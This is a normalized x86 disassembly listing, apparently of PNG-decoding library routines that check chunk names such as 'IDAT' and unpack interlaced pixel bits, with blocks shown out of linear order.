pop ebx
add esp 0x14
retn
movzx ecx [ eax + 0x2 ]
movzx edx [ eax + 0x3 ]
movzx ebx [ eax + 0x5 ]
push ebp
movzx ebp [ eax + 0x1 ]
shl ebp 0x8
add ebp ecx
movzx ecx [ eax + 0x4 ]
shl ebp 0x8
add ebp edx
movzx edx [ eax + 0x6 ]
shl ebx 0x8
add ebx edx
movzx edx [ eax + 0x8 ]
shl ebp 0x8
add ebp ecx
movzx ecx [ eax + 0x7 ]
shl ebx 0x8
add ebx ecx
mov cl [ eax + 0x9 ]
shl ebx 0x8
add ebx edx
mov dl [ eax + 0xa ]
add eax 0xb
mov [ esp + 0x13 ] cl
mov [ esp + 0x12 ] dl
mov [ esp + 0x1c ] eax
test cl cl
jne r-xdata
mov ecx r--data
call sub_43b800
inc eax
cmp [ eax ] 0x0
jne r-xdata
cmp cl 0x1
jne r-xdata
cmp dl 0x2
jne r-xdata
cmp cl 0x2
jne r-xdata
cmp dl 0x3
jne r-xdata
mov ecx r--data
call sub_43b800
mov ecx [ esi + 0x288 ]
cmp ecx edi
je r-xdata
jmp r-xdata
cmp cl 0x3
jne r-xdata
cmp dl 0x3
jne r-xdata
jmp r-xdata
pop ebp
mov [ esi + 0x288 ] edi
pop edi
pop esi
pop ebx
add esp 0x14
retn
mov eax [ esi + 0x24c ]
push ecx
cmp eax edi
je r-xdata
cmp [ eax ] 0x0
mov edi eax
je r-xdata
cmp cl 0x4
jb r-xdata
cmp dl 0x4
je r-xdata
jmp r-xdata
call sub_44120e
add esp 0x4
push esi
call eax
add esp 0x8
pop ebp
mov [ esi + 0x288 ] edi
pop edi
pop esi
pop ebx
add esp 0x14
retn
movzx eax dl
lea ecx [ eax * 4 ]
mov [ esp + 0x18 ] eax
call sub_43b6d0
mov [ esp + 0x14 ] eax
test eax eax
jne r-xdata
inc edi
cmp [ edi ] 0x0
jne r-xdata
mov ecx r--data
call sub_43b800
mov dl [ esp + 0x12 ]
mov eax [ esp + 0x1c ]
xor edx edx
cmp [ esp + 0x18 ] edx
jle r-xdata
mov ecx [ esi + 0x288 ]
test ecx ecx
je r-xdata
mov ecx [ esp + 0x18 ]
movzx edx [ esp + 0x13 ]
mov edi [ esp + 0x28 ]
push eax
mov eax [ esp + 0x20 ]
push eax
mov eax [ esi + 0x288 ]
push ecx
push edx
push ebx
push ebp
push eax
mov eax esi
call sub_43c1e0
mov eax [ esi + 0x288 ]
add esp 0x1c
test eax eax
je r-xdata
nop
mov ecx r--data
mov [ esi + 0x288 ] 0x0
call sub_43b800
pop ebp
pop edi
pop esi
pop ebx
add esp 0x14
retn
mov eax [ esi + 0x24c ]
push ecx
test eax eax
je r-xdata
mov eax [ esi + 0x24c ]
mov [ esi + 0x288 ] 0x0
test eax eax
je r-xdata
mov ecx [ esi + 0x24c ]
push eax
test ecx ecx
je r-xdata
mov eax [ esi + 0x44 ]
push r--data
test eax eax
je r-xdata
lea esp [ esp ]
call sub_44120e
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
mov edx [ esp + 0x14 ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x14
mov [ esp + 0x4 ] edx
jmp sub_44120e
mov ecx [ esp + 0x14 ]
push ecx
push esi
call eax
add esp 0x8
pop ebp
pop edi
pop esi
pop ebx
add esp 0x14
retn
call sub_44120e
add esp 0x4
push esi
call ecx
add esp 0x8
jmp r-xdata
call sub_43baf0
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
cmp edi ecx
ja r-xdata
inc edi
cmp edi ecx
jbe r-xdata
mov eax [ esi + 0x24c ]
mov [ esi + 0x288 ] 0x0
test eax eax
jne r-xdata
mov eax [ esi + 0x24c ]
push ecx
test eax eax
je r-xdata
mov ecx [ esi + 0x288 ]
test ecx ecx
je r-xdata
inc edx
cmp edx [ esp + 0x18 ]
jl r-xdata
cmp [ edi ] 0x0
je r-xdata
mov edx [ esp + 0x14 ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x14
mov [ esp + 0x4 ] edx
jmp sub_44120e
call sub_44120e
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
mov ecx [ esp + 0x20 ]
inc edi
mov [ eax + edx * 4 ] edi
cmp edi ecx
ja r-xdata
sub_439b30
sub esp 0x10
push ebx
push ebp
mov ebp [ esp + 0x1c ]
push esi
mov esi ecx
mov ebx eax
mov eax [ esi + 0x68 ]
push edi
test al 0x1
jne r-xdata
test al 0x4
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
test ebp ebp
je r-xdata
mov ecx r--data
mov edi eax
call sub_437670
push 0x0
mov ecx esi
call sub_4376e0
add esp 0x4
test eax eax
jne r-xdata
mov ecx r--data
call sub_43b800
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
lea ecx [ ebx + 0x1 ]
call sub_43b6d0
mov [ esi + 0x288 ] eax
test eax eax
jne r-xdata
test [ ebp + 0x8 ] 0x4000
je r-xdata
mov ecx [ esi + 0x288 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x288 ]
mov [ ebx + eax ] 0x0
mov eax [ esi + 0x288 ]
lea ecx [ esp + 0x14 ]
inc eax
push ecx
push eax
call sub_456680
fstp [ esp + 0x20 ]
mov edx [ esp + 0x1c ]
add esp 0x8
cmp [ edx ] 0x0
je r-xdata
mov ecx r--data
jmp r-xdata
pop edi
mov [ esi + 0x288 ] 0x0
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov eax [ esi + 0x24c ]
push ecx
test eax eax
je r-xdata
mov eax [ esi + 0x288 ]
mov edi eax
cmp [ edi ] 0x0
je r-xdata
mov ecx r--data
call sub_43b800
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
call sub_43b800
push ebx
mov ecx esi
call sub_4376e0
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
call sub_44120e
add esp 0x4
push esi
call eax
add esp 0x8
mov [ esi + 0x288 ] 0x0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
inc edi
add eax ebx
cmp eax edi
jae r-xdata
inc edi
cmp [ edi ] 0x0
jne r-xdata
lea eax [ esp + 0x14 ]
push eax
push edi
call sub_456680
mov ecx [ esp + 0x1c ]
add esp 0x8
cmp [ ecx ] 0x0
je r-xdata
mov ecx r--data
jmp r-xdata
mov ecx [ esi + 0x288 ]
lea edx [ ecx + ebx ]
cmp edx edi
jb r-xdata
mov ecx r--data
fstp st0
call sub_43b800
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
call sub_43b800
fstp st0
mov ecx r--data
fldz
fld [ esp + 0x18 ]
fcom st1
fnstsw ax
test ah 0x41
jpo r-xdata
fstp st1
fxch st1
fcomp st2
fnstsw ax
test ah 0x1
je r-xdata
fstp st1
test ebp ebp
je r-xdata
mov edx [ esi + 0x288 ]
fstp st1
mov ecx esi
fstp st0
call sub_43b6a0
mov [ esi + 0x288 ] 0x0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov al [ ecx ]
fstp [ ebp + 0xe0 ]
or [ ebp + 0x8 ] 0x4000
fstp [ ebp + 0xe8 ]
mov [ ebp + 0xdc ] al
mov edx [ esi + 0x288 ]
mov ecx esi
call sub_43b6a0
mov [ esi + 0x288 ] 0x0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
sub_439d40
sub esp 0x14
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x10 ] eax
push ebx
push ebp
mov ebp [ esp + 0x20 ]
push esi
mov esi edx
test [ esi + 0x68 ] 0x1
push edi
mov edi ecx
jne r-xdata
test ebp ebp
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
mov eax [ esi + 0x68 ]
test al 0x4
je r-xdata
test [ ebp + 0x8 ] 0x200
je r-xdata
cmp edi 0x7
je r-xdata
or eax 0x8
mov [ esi + 0x68 ] eax
mov ecx r--data
mov ebx 0x7
lea edi [ esp + 0x18 ]
call sub_437670
push 0x0
mov ecx esi
call sub_4376e0
add esp 0x4
test eax eax
jne r-xdata
mov ecx r--data
jmp r-xdata
mov ecx [ esp + 0x20 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_43f96b
add esp 0x14
retn
movzx eax [ esp + 0x1e ]
mov dl [ esp + 0x1c ]
movzx ecx [ esp + 0x1d ]
mov [ esp + 0x16 ] al
movzx eax [ esp + 0x1b ]
mov [ esp + 0x14 ] dl
movzx dx [ esp + 0x18 ]
mov [ esp + 0x13 ] al
mov eax 0x100
imul dx ax
mov [ esp + 0x15 ] cl
movzx ecx [ esp + 0x1a ]
mov [ esp + 0x12 ] cl
movzx cx [ esp + 0x19 ]
add dx cx
mov [ esp + 0x10 ] dx
test ebp ebp
je r-xdata
call sub_43b800
push edi
mov ecx esi
call sub_4376e0
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x10 ]
xor ecx esp
call sub_43f96b
add esp 0x14
retn
mov eax 0x200
test [ esi + 0x68 ] eax
jne r-xdata
mov edx [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
or [ ebp + 0x8 ] eax
mov [ ebp + 0x3c ] edx
mov [ ebp + 0x40 ] ecx
sub_439e60
push ebp
mov ebp [ esp + 0xc ]
push esi
mov esi eax
test [ esi + 0x68 ] 0x1
jne r-xdata
mov eax [ esi + 0x68 ]
test al 0x4
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
mov ecx [ esi + 0x288 ]
test ecx ecx
je r-xdata
or eax 0x8
mov [ esi + 0x68 ] eax
lea ecx [ ebp + 0x1 ]
call sub_43b6d0
mov [ esi + 0x288 ] eax
test eax eax
jne r-xdata
mov eax [ esi + 0x24c ]
push ecx
test eax eax
je r-xdata
push ebx
push edi
mov ebx ebp
mov edi eax
call sub_437670
push 0x0
mov ecx esi
call sub_4376e0
add esp 0x4
test eax eax
jne r-xdata
mov ecx r--data
call sub_43b800
pop esi
pop ebp
retn
call sub_44120e
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
mov ecx [ esi + 0x288 ]
test ecx ecx
je r-xdata
mov ebx [ esi + 0x288 ]
lea eax [ ebx + ebp ]
mov [ eax ] 0x0
cmp [ ebx ] 0x0
mov ebp ebx
je r-xdata
pop edi
pop ebx
mov [ esi + 0x288 ] 0x0
pop esi
pop ebp
retn
mov eax [ esi + 0x24c ]
push ecx
test eax eax
je r-xdata
cmp ebp eax
je r-xdata
nop
call sub_44120e
add esp 0x4
push esi
call eax
add esp 0x8
pop edi
pop ebx
mov [ esi + 0x288 ] 0x0
pop esi
pop ebp
retn
mov eax [ esi + 0x6c ]
mov [ esp + 0x18 ] eax
or eax 0x100000
mov [ esi + 0x6c ] eax
mov eax [ esi + 0x248 ]
push 0x10
test eax eax
je r-xdata
inc ebp
inc ebp
cmp [ ebp ] 0x0
jne r-xdata
call sub_441c3d
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
mov eax [ esp + 0x18 ]
mov [ esi + 0x6c ] eax
test edi edi
jne r-xdata
test [ esi + 0x6c ] 0x100000
jne r-xdata
mov edi eax
test edi edi
jne r-xdata
mov eax ebp
mov [ edi ] 0xffffffff
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebp
lea edx [ eax + 0x1 ]
jmp r-xdata
mov ecx r--data
call sub_43b800
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ esp + 0x14 ]
push edi
push ecx
sub eax edx
push esi
mov [ edi + 0xc ] eax
call sub_43c630
mov ebx eax
mov eax [ esi + 0x288 ]
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi + 0x24c ]
mov [ esi + 0x288 ] 0x0
push edi
test eax eax
je r-xdata
mov ecx [ esi + 0x24c ]
push eax
test ecx ecx
je r-xdata
call sub_44120e
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
call sub_44120e
add esp 0x4
push esi
call ecx
add esp 0x8
jmp r-xdata
pop edi
pop ebx
pop esi
pop ebp
retn
mov ecx r--data
call sub_43b800
test ebx ebx
je r-xdata
sub_43a040
push ecx
push ebp
mov ebp [ esp + 0x10 ]
push esi
mov esi eax
test [ esi + 0x68 ] 0x1
jne r-xdata
mov eax [ esi + 0x68 ]
test al 0x4
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
mov ecx [ esi + 0x288 ]
test ecx ecx
je r-xdata
or eax 0x8
mov [ esi + 0x68 ] eax
lea ecx [ ebp + 0x1 ]
call sub_43b6d0
mov [ esi + 0x288 ] eax
test eax eax
jne r-xdata
mov eax [ esi + 0x24c ]
push ecx
test eax eax
je r-xdata
push ebx
push edi
mov ebx ebp
mov edi eax
call sub_437670
xor ebx ebx
push ebx
mov ecx esi
call sub_4376e0
add esp 0x4
test eax eax
jne r-xdata
mov ecx r--data
call sub_43b800
pop esi
pop ebp
pop ecx
retn
call sub_44120e
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
mov ecx [ esi + 0x288 ]
cmp ecx ebx
je r-xdata
mov eax [ esi + 0x288 ]
mov [ eax + ebp ] bl
mov eax [ esi + 0x288 ]
mov edi eax
cmp [ edi ] bl
je r-xdata
pop edi
mov [ esi + 0x288 ] ebx
pop ebx
pop esi
pop ebp
pop ecx
retn
mov eax [ esi + 0x24c ]
push ecx
cmp eax ebx
je r-xdata
lea ecx [ eax + ebp - 0x2 ]
cmp edi ecx
jb r-xdata
inc edi
cmp [ edi ] bl
jne r-xdata
call sub_44120e
add esp 0x4
push esi
call eax
add esp 0x8
pop edi
mov [ esi + 0x288 ] ebx
pop ebx
pop esi
pop ebp
pop ecx
retn
movsx ebx [ edi + 0x1 ]
inc edi
test ebx ebx
je r-xdata
mov ecx r--data
call sub_43b800
sub edi [ esi + 0x288 ]
lea ecx [ esp + 0x10 ]
inc edi
push edi
push ebp
push ebx
mov edx esi
call sub_437920
mov eax [ esi + 0x6c ]
mov [ esp + 0x28 ] eax
or eax 0x100000
mov [ esi + 0x6c ] eax
mov eax [ esi + 0x248 ]
add esp 0xc
push 0x10
test eax eax
je r-xdata
mov ecx r--data
call sub_43b800
xor ebx ebx
call sub_441c3d
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
mov edx [ esp + 0x1c ]
mov [ esi + 0x6c ] edx
test ebp ebp
jne r-xdata
test [ esi + 0x6c ] 0x100000
jne r-xdata
mov ebp eax
test ebp ebp
jne r-xdata
mov edx [ esp + 0x10 ]
mov [ ebp ] ebx
mov eax [ esi + 0x288 ]
mov [ ebp + 0x4 ] eax
mov ecx [ esi + 0x288 ]
mov eax [ esp + 0x18 ]
push ebp
push eax
add ecx edi
push esi
mov [ ebp + 0x8 ] ecx
mov [ ebp + 0xc ] edx
call sub_43c630
mov edi eax
mov eax [ esi + 0x24c ]
add esp 0xc
push ebp
test eax eax
je r-xdata
mov ecx r--data
call sub_43b800
mov ecx [ esi + 0x288 ]
test ecx ecx
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
call sub_44120e
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
pop edi
pop ebx
mov [ esi + 0x288 ] 0x0
pop esi
pop ebp
pop ecx
retn
mov eax [ esi + 0x24c ]
push ecx
test eax eax
je r-xdata
mov [ esi + 0x288 ] 0x0
test edi edi
je r-xdata
mov eax [ esi + 0x24c ]
push ecx
test eax eax
je r-xdata
mov ecx [ esi + 0x288 ]
test ecx ecx
je r-xdata
call sub_44120e
add esp 0x4
push esi
call eax
add esp 0x8
pop edi
pop ebx
mov [ esi + 0x288 ] ebp
pop esi
pop ebp
pop ecx
retn
pop edi
pop ebx
pop esi
pop ebp
pop ecx
retn
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
call sub_44120e
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
sub_43a290
sub esp 0x14
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x18 ]
push ebx
push esi
mov esi edx
mov [ esp + 0xc ] eax
mov eax [ esi + 0x68 ]
push edi
mov ebx ecx
mov [ esp + 0xc ] 0x0
test al 0x4
je r-xdata
test [ esi + 0x11c ] 0x20
lea edi [ esi + 0x11c ]
jne r-xdata
mov ecx [ esi + 0x11c ]
mov [ esp + 0x14 ] 0x49
mov [ esp + 0x15 ] 0x44
mov [ esp + 0x16 ] 0x41
mov [ esp + 0x17 ] 0x54
cmp ecx [ esp + 0x14 ]
je r-xdata
test [ esi + 0x6c ] 0x8000
jne r-xdata
mov edx edi
mov ecx esi
call sub_437320
cmp eax 0x3
je r-xdata
or eax 0x8
mov [ esi + 0x68 ] eax
mov edx [ edi ]
mov al [ edi + 0x4 ]
push ebp
lea ebp [ esi + 0x26c ]
mov [ ebp ] edx
mov [ ebp + 0x4 ] al
mov [ esi + 0x270 ] 0x0
mov [ esi + 0x278 ] ebx
test ebx ebx
jne r-xdata
cmp [ esi + 0x21c ] 0x0
jne r-xdata
cmp [ esi + 0x21c ] 0x0
jne r-xdata
mov ecx ebx
call sub_43b650
mov edi eax
mov [ esi + 0x274 ] eax
call sub_437670
mov [ esi + 0x274 ] ebx
jmp r-xdata
mov [ esp + 0xc ] ebx
jmp r-xdata
mov ecx r--data
call sub_43b8f0
mov edx [ esp + 0x14 ]
push edx
push ebp
push esi
call eax
mov edi eax
add esp 0x8
test edi edi
jge r-xdata
mov eax [ esi + 0x21c ]
test eax eax
je r-xdata
mov eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_4376e0
mov ecx [ esp + 0x20 ]
add esp 0x4
pop edi
pop esi
pop ebx
xor ecx esp
call sub_43f96b
add esp 0x14
retn
mov [ esi + 0x274 ] 0x0
mov eax [ esi + 0x24c ]
push ecx
test eax eax
je r-xdata
jne r-xdata
mov ecx r--data
call sub_43b8f0
test edi edi
call sub_44120e
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
mov ecx [ esi + 0x274 ]
pop ebp
test ecx ecx
je r-xdata
test [ esi + 0x11c ] 0x20
lea edx [ esi + 0x11c ]
jne r-xdata
mov ecx [ esp + 0x14 ]
push ecx
jmp r-xdata
mov ecx esi
call sub_437320
cmp eax 0x3
je r-xdata
mov ebx ebp
mov eax esi
call sub_43ca70
add esp 0x4
mov ecx r--data
call sub_43b8f0
sub_43a420
sub esp 0x58
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x54 ] eax
mov al [ ecx ]
cmp al 0x41
jb r-xdata
test esi esi
jne r-xdata
cmp al 0x7a
ja r-xdata
mov edx r--data
lea eax [ esp ]
mov ecx esi
call sub_43b860
push esi
lea ecx [ esp + 0x4 ]
push esi
mov ecx r--data
jmp r-xdata
cmp al 0x5a
jbe r-xdata
call sub_43b740
add esp 0x4
mov al [ ecx + 0x1 ]
cmp al 0x41
jb r-xdata
cmp al 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
cmp al 0x5a
jbe r-xdata
mov al [ ecx + 0x2 ]
cmp al 0x41
jb r-xdata
cmp al 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
cmp al 0x5a
jbe r-xdata
mov al [ ecx + 0x3 ]
cmp al 0x41
jb r-xdata
cmp al 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
cmp al 0x5a
jbe r-xdata
mov ecx [ esp + 0x54 ]
xor ecx esp
call sub_43f96b
add esp 0x58
retn
cmp al 0x61
jae r-xdata
sub_43a4b0
sub esp 0x10
cmp [ esp + 0x14 ] 0xff
jne r-xdata
movzx ecx [ eax + 0x10b ]
push ebx
push ebp
push esi
mov esi ecx
mov ebx 0x1
sub esi ebx
push edi
je r-xdata
mov cl [ eax + 0x10b ]
cmp cl 0x8
movzx ecx cl
jb r-xdata
mov esi [ eax + 0xec ]
mov ecx [ eax + 0xc8 ]
add esi ebx
test [ eax + 0x70 ] 0x10000
mov edi edx
mov [ esp + 0x10 ] 0x80
je r-xdata
sub esi ebx
je r-xdata
imul ecx [ eax + 0xc8 ]
add ecx 0x7
shr ecx 0x3
shr ecx 0x3
imul ecx [ eax + 0xc8 ]
jmp r-xdata
mov ebp 0x7
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x18 ] 0xffffffff
xor ebp ebp
mov [ esp + 0x1c ] 0x7
mov [ esp + 0x18 ] ebx
jmp r-xdata
mov esi [ eax + 0xec ]
mov ecx [ eax + 0xc8 ]
add esi ebx
test [ eax + 0x70 ] 0x10000
mov edi edx
mov [ esp + 0x10 ] 0x80
je r-xdata
sub esi 0x2
mov esi [ eax + 0xec ]
je r-xdata
mov eax [ eax + 0xec ]
push ecx
inc eax
push eax
push edx
call sub_443790
add esp 0xc
add esp 0x10
retn
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov [ esp + 0x14 ] ecx
mov edx ebp
test ecx ecx
jbe r-xdata
mov ebp 0x6
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x18 ] 0xfffffffe
xor ebp ebp
mov [ esp + 0x1c ] 0x6
mov [ esp + 0x18 ] 0x2
jmp r-xdata
mov ecx [ eax + 0xc8 ]
add esi ebx
test [ eax + 0x70 ] 0x10000
mov edi edx
mov [ esp + 0x10 ] 0x80
je r-xdata
mov eax [ eax + 0xc8 ]
add esi ebx
shr ecx 0x3
mov ebp edx
mov edi ecx
mov bl 0x80
test eax eax
jbe r-xdata
cmp edx [ esp + 0x1c ]
jne r-xdata
movzx eax [ esi ]
mov cl dl
shr eax cl
mov ecx 0x7
sub ecx edx
and eax ebx
mov ebx 0x7f7f
sar ebx cl
mov ecx edx
shl al cl
and bl [ edi ]
or bl al
mov [ edi ] bl
mov ebx 0x1
mov [ esp + 0x14 ] ecx
mov edx ebp
test ecx ecx
jbe r-xdata
mov ebp 0x4
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x18 ] 0xfffffffc
mov eax 0x4
xor ebp ebp
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] eax
jmp r-xdata
mov [ esp + 0x10 ] eax
add edx [ esp + 0x18 ]
add esi ebx
mov edx ebp
add edi ebx
jmp r-xdata
cmp edx [ esp + 0x1c ]
jne r-xdata
movzx eax [ esi ]
mov cl dl
shr eax cl
mov ecx 0x6
sub ecx edx
mov ebx 0x3f3f
sar ebx cl
and eax 0x3
mov ecx edx
shl al cl
and bl [ edi ]
or bl al
mov [ edi ] bl
mov ebx 0x1
mov [ esp + 0x1c ] ecx
mov edx ebp
test ecx ecx
jbe r-xdata
add esi edi
add ebp edi
cmp bl 0x1
jne r-xdata
push edi
push esi
push ebp
call sub_443790
add esp 0xc
sar [ esp + 0x10 ] 0x1
mov [ esp + 0x10 ] 0x80
jmp r-xdata
cmp [ esp + 0x10 ] ebx
jne r-xdata
add edx [ esp + 0x18 ]
add esi ebx
mov edx ebp
add edi ebx
jmp r-xdata
cmp edx [ esp + 0x14 ]
jne r-xdata
movzx eax [ esi ]
mov cl dl
shr eax cl
mov ecx 0x4
sub ecx edx
mov ebx 0xf0f
sar ebx cl
and eax 0xf
mov ecx edx
shl al cl
and bl [ edi ]
or bl al
mov [ edi ] bl
mov ebx 0x1
shr bl 0x1
mov bl 0x80
jmp r-xdata
mov eax [ esp + 0x24 ]
test [ esp + 0x10 ] eax
je r-xdata
sub [ esp + 0x14 ] ebx
jne r-xdata
sar [ esp + 0x10 ] 0x1
mov [ esp + 0x10 ] 0x80
jmp r-xdata
cmp [ esp + 0x10 ] ebx
jne r-xdata
add edx [ esp + 0x18 ]
add esi ebx
mov edx ebp
add edi ebx
jmp r-xdata
mov cl [ esp + 0x24 ]
test cl bl
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
sub [ esp + 0x10 ] 0x1
jne r-xdata
mov ecx [ esp + 0x24 ]
test [ esp + 0x10 ] ecx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
sub [ esp + 0x14 ] ebx
jne r-xdata
sar [ esp + 0x10 ] 0x1
mov [ esp + 0x10 ] 0x80
jmp r-xdata
cmp [ esp + 0x10 ] ebx
jne r-xdata
mov eax [ esp + 0x24 ]
test [ esp + 0x10 ] eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
sub [ esp + 0x1c ] ebx
jne r-xdata
sub_43a7a0
sub esp 0x4c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x48 ] eax
mov eax [ esp + 0x50 ]
mov ecx [ eax + 0xec ]
add ecx 0x1
movzx edx [ eax + 0x124 ]
push ebx
mov ebx [ eax + 0x70 ]
push esi
lea esi [ eax + 0x100 ]
mov eax 0x8
push edi
mov [ esp + 0x30 ] eax
mov [ esp + 0x34 ] eax
mov eax 0x4
mov edi 0x2
mov [ esp + 0x28 ] esi
mov [ esp + 0x38 ] eax
mov [ esp + 0x3c ] eax
mov [ esp + 0x40 ] edi
mov [ esp + 0x44 ] edi
mov [ esp + 0x48 ] 0x1
je r-xdata
mov ecx [ esp + 0x54 ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_43f96b
add esp 0x4c
retn
test esi esi
je r-xdata
mov edx [ esp + edx * 4 + 0x30 ]
mov eax [ esi ]
movzx esi [ esi + 0xb ]
push ebp
mov ebp eax
imul ebp edx
mov [ esp + 0x30 ] edx
mov edx esi
sub edx 0x1
mov [ esp + 0x24 ] ebp
je r-xdata
lea edx [ eax - 0x1 ]
lea edi [ ebp - 0x1 ]
shr edx 0x3
shr edi 0x3
add edx ecx
add edi ecx
mov [ esp + 0x20 ] edx
test ebx 0x10000
je r-xdata
sub edx 0x1
je r-xdata
lea ecx [ eax - 0x1 ]
and ecx 0x7
mov edx 0x7
sub edx ecx
lea ecx [ ebp - 0x1 ]
and ecx 0x7
mov esi 0x7
sub esi ecx
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x1c ] 0x7
mov [ esp + 0x14 ] 0x1
lea edx [ eax - 0x1 ]
lea esi [ ebp - 0x1 ]
and edx 0x7
and esi 0x7
mov [ esp + 0x18 ] 0x7
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x14 ] 0xffffffff
jmp r-xdata
lea edx [ eax - 0x1 ]
lea edi [ ebp - 0x1 ]
shr edx 0x2
shr edi 0x2
add edx ecx
add edi ecx
mov [ esp + 0x18 ] edx
test ebx 0x10000
je r-xdata
sub edx edi
lea edi [ ebp - 0x1 ]
je r-xdata
mov ecx [ esp + 0x2c ]
mov al [ ecx + 0xb ]
cmp al 0x8
mov [ ecx ] ebp
movzx eax al
jb r-xdata
mov eax [ esp + 0x20 ]
mov al [ eax ]
mov cl dl
shr al cl
mov ecx [ esp + 0x30 ]
and al 0x1
test ecx ecx
jle r-xdata
mov [ esp + 0x24 ] edx
mov [ esp + 0x50 ] 0x0
test eax eax
jbe r-xdata
dec ebp
lea ecx [ eax - 0x1 ]
and ecx 0x3
and ebp 0x3
mov edx 0x3
sub edx ecx
mov esi 0x3
sub esi ebp
add edx edx
add esi esi
mov [ esp + 0x1c ] 0x0
mov ebp 0x6
mov [ esp + 0x20 ] 0x2
lea esi [ ebp + ebp - 0x1 ]
lea edx [ eax + eax - 0x1 ]
and edx 0x6
and esi 0x6
mov [ esp + 0x1c ] 0x6
xor ebp ebp
mov [ esp + 0x20 ] 0xfffffffe
jmp r-xdata
lea edx [ eax - 0x1 ]
shr edx 0x1
shr edi 0x1
add edx ecx
add edi ecx
mov [ esp + 0x18 ] edx
test ebx 0x10000
je r-xdata
shr esi 0x3
lea ebx [ eax - 0x1 ]
imul edi esi
imul ebx esi
add ebx ecx
add edi ecx
mov [ esp + 0x14 ] 0x0
test eax eax
jbe r-xdata
imul eax ebp
add eax 0x7
shr eax 0x3
shr eax 0x3
imul eax ebp
jmp r-xdata
cmp edx [ esp + 0x1c ]
jne r-xdata
mov [ esp + 0x28 ] ecx
nop
mov ebp [ esp + 0x24 ]
mov eax [ esp + 0x18 ]
mov al [ eax ]
mov cl dl
shr al cl
mov ecx [ esp + 0x30 ]
and al 0x3
mov [ esp + 0x13 ] al
test ecx ecx
jle r-xdata
mov [ esp + 0x14 ] 0x0
test eax eax
jbe r-xdata
lea edx [ eax - 0x1 ]
and edx 0x1
dec ebp
add edx edx
add edx edx
and ebp 0x1
add ebp ebp
mov ecx edx
mov edx 0x4
add ebp ebp
mov esi 0x4
sub edx ecx
sub esi ebp
mov ebp 0x4
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x1c ] ebp
or edx 0xffffffff
lea ecx [ eax * 4 ]
sub edx ecx
or esi 0xffffffff
lea ecx [ ebp * 4 ]
sub esi ecx
and edx 0x4
and esi 0x4
mov [ esp + 0x20 ] 0x4
xor ebp ebp
mov [ esp + 0x1c ] 0xfffffffc
jmp r-xdata
push esi
lea eax [ esp + 0x54 ]
push ebx
push eax
call sub_443790
mov eax [ esp + 0x3c ]
add esp 0xc
test eax eax
jle r-xdata
mov [ ecx + 0x4 ] eax
pop ebp
add edx [ esp + 0x14 ]
mov edx [ esp + 0x18 ]
dec [ esp + 0x20 ]
jmp r-xdata
add esi [ esp + 0x14 ]
mov esi [ esp + 0x18 ]
dec edi
jmp r-xdata
cmp edx ebp
jne r-xdata
mov [ esp + 0x28 ] ecx
jmp r-xdata
lea ebx [ ebx ]
mov [ esp + 0x28 ] 0x0
test eax eax
jbe r-xdata
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x2c ]
inc eax
sub ebx esi
mov [ esp + 0x14 ] eax
cmp eax [ edx ]
jb r-xdata
mov ebp eax
jmp r-xdata
jmp r-xdata
mov eax [ esp + 0x50 ]
mov ecx [ esp + 0x2c ]
inc eax
mov [ esp + 0x24 ] edx
mov [ esp + 0x50 ] eax
cmp eax [ ecx ]
